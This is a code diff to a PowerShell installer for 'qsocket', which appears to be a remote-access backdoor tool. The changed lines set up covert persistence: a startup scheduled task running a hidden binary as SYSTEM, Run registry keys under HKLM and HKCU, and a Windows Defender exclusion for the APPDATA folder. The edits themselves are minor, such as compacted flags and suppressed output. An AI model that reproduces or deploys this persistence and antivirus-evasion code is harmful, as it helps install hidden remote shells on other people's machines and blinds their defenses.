@@ -109,9 +109,9 @@ function Download-Qsocket-Util($path)
 function Create-Sceduled-Task($path, $secret)
 {
     Print-Debug "Creating scheduled task..."
-    Print-Debug "Task command: cmd.exe /c (tasklist /FI 'WINDOWTITLE eq $secret'|findstr $QS_SCHEDULED_TASK_NAME) || $path\$QS_BIN_HIDDEN_NAME -l -i -q -s $secret"
+    Print-Debug "Task command: cmd.exe /c (tasklist /FI 'WINDOWTITLE eq $secret'|findstr $QS_SCHEDULED_TASK_NAME) || $path\$QS_BIN_HIDDEN_NAME -liqs $secret"
     try {
-        $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c (tasklist /FI 'WINDOWTITLE eq $secret'|findstr $QS_SCHEDULED_TASK_NAME) || $path\$QS_BIN_HIDDEN_NAME -l -i -q -s $secret"
+        $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c (tasklist /FI 'WINDOWTITLE eq $secret'|findstr $QS_SCHEDULED_TASK_NAME) || $path\$QS_BIN_HIDDEN_NAME -liqs $secret"
         $T = New-ScheduledTaskTrigger -AtStartup
         if(Is-Administrator){
             $P = New-ScheduledTaskPrincipal "NT AUTHORITY\SYSTEM" -RunLevel Highest
@@ -133,10 +133,10 @@ function Create-Run-Key($path, $secret)
     try {
         if(Is-Administrator){
             Print-Debug "Running as administrator"
-            reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v "$path" /t REG_SZ /d "$path\$QS_BIN_HIDDEN_NAME -l -i -q -s $secret" >$null
+            reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v "$path" /t REG_SZ /d "$path\$QS_BIN_HIDDEN_NAME -liqs $secret" >$null
         }else{
             Print-Debug "Running as $env:UserName"
-            reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "$path" /t REG_SZ /d "$path\$QS_BIN_HIDDEN_NAME -l -i -q -s $secret" >$null
+            reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "$path" /t REG_SZ /d "$path\$QS_BIN_HIDDEN_NAME -liqs $secret" >$null
         }
     }catch {
         Print-Debug $_.Exception
@@ -199,7 +199,7 @@ try {
 
 try {
     Print-Progress "Testing qsocket binaries"
-    #$SECRET = ((Start-Process -Wait (Join-Path -Path $QS_PATH -ChildPath "$QS_BIN_HIDDEN_NAME") "-g" -NoNewWindow) | Out-String)
+    # $SECRET = ((Start-Process -Wait (Join-Path -Path $QS_PATH -ChildPath "$QS_BIN_HIDDEN_NAME") "-g" -NoNewWindow) | Out-String)
     Print-Ok
 }catch{
     Print-Fail
@@ -213,7 +213,7 @@ if ($SECRET.Length -eq 0) {
 if (Is-Administrator) {
     Print-Progress "Adding defender exclusion path"
     try {
-        Add-MpPreference -ExclusionPath "$env:APPDATA"
+        Add-MpPreference -ExclusionPath "$env:APPDATA" >$null
         Print-Ok
     }catch {
         Print-Fail
